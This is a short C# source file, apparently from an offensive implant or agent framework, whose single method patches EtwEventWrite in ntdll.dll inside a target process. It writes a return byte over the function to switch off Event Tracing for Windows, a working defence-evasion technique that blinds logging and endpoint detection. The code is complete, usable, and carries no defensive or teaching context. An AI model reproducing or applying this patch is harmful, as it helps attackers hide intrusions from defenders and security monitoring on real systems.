using System;

using Agent.PInvoke;

namespace Agent.Execution
{
    internal class RemoteExecution
    {
        internal static void PatchEtwEventWrite(IntPtr hProcess)
        {
            var hook = new byte[] { 0xc3 };
            var address = Win32.Kernel32.GetProcAddress(Win32.Kernel32.LoadLibrary("ntdll.dll"), "EtwEventWrite");

            Win32.Kernel32.VirtualProtectEx(hProcess, address, (UIntPtr)hook.Length, 0x40, out uint oldProtect);
            Win32.Kernel32.WriteProcessMemory(hProcess, address, hook, hook.Length, out IntPtr bytesWritten);
            Win32.Kernel32.VirtualProtectEx(hProcess, address, (UIntPtr)hook.Length, oldProtect, out uint x);
        }
    }
}